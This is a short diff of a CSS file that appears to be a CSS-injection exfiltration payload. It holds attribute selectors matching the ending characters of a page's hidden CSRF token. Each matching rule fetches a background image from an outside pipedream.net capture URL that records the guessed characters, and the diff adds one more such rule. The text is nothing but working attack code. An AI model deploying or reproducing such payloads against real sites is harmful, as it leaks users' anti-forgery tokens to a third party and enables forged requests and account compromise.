@@ -47,6 +47,9 @@ input[name="csrf"][value$="!gZ"] {
 input[name="csrf"][value$="&gZ"] {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=&gZ)
 }
+input[name="csrf"][value$="=gZ"] {
+  background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=gZ)
+}
 
 input[name="csrf"][value$="agZ"] {
   background: url(https://en6gc9c8vfzvo.x.pipedream.net/?1=agZ)
